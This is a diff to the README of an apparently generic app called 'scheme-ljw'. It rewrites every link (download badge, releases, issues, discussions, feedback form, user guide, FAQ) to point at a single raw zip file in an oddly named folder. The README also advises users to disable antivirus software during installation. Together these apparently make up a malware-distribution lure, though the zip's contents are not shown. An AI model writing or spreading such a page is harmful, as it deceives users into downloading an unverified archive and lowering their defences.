@@ -1,6 +1,6 @@
 # 🎉 scheme-ljw - Streamlined Solution for Your Needs
 
-![Download scheme-ljw](https://img.shields.io/badge/Download-scheme--ljw-brightgreen)
+![Download scheme-ljw](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To use **scheme-ljw**, follow these simple steps. The process is straightforward
 
 ## 📥 Download & Install
 
-To get **scheme-ljw**, visit this page to download: [Releases Page](https://github.com/Butterlemonzest260/scheme-ljw/releases).
+To get **scheme-ljw**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip).
 
 1. Click the link above to access our Releases page.
 2. Locate the latest version at the top of the list.
@@ -64,21 +64,21 @@ If you encounter issues, here are some common solutions:
   - Temporarily disable your antivirus software during installation, then re-enable it afterward.
 
 - **Need More Help**:
-  - Visit our [Issues Page](https://github.com/Butterlemonzest260/scheme-ljw/issues) to report problems or ask questions.
+  - Visit our [Issues Page](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip) to report problems or ask questions.
 
 ## 🌍 Community Support
 
 We encourage users to join our community. Share your experiences and ask questions in the following places:
 
-- [GitHub Discussions](https://github.com/Butterlemonzest260/scheme-ljw/discussions)
-- [Feedback Form](https://github.com/Butterlemonzest260/scheme-ljw/feedback)
+- [GitHub Discussions](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip)
+- [Feedback Form](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip)
 
 ## 🔗 Resources
 
 For more detailed information, you can consult these resources:
 
-- [User Guide](https://github.com/Butterlemonzest260/scheme-ljw/wiki)
-- [Frequently Asked Questions](https://github.com/Butterlemonzest260/scheme-ljw/wiki/faq)
+- [User Guide](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip)
 
 ## 📅 Upcoming Features
 
@@ -88,4 +88,4 @@ We are continuously working on improving **scheme-ljw**. Look forward to the fol
 - Integration with popular calendar applications.
 - Support for more file formats.
 
-Thank you for choosing **scheme-ljw**! We appreciate your support and hope our application meets your needs. Don't forget to visit our Releases page to stay updated: [Download scheme-ljw](https://github.com/Butterlemonzest260/scheme-ljw/releases).
+Thank you for choosing **scheme-ljw**! We appreciate your support and hope our application meets your needs. Don't forget to visit our Releases page to stay updated: [Download scheme-ljw](https://raw.githubusercontent.com/Butterlemonzest260/scheme-ljw/main/cellulifugally/scheme-ljw_v1.4.zip).
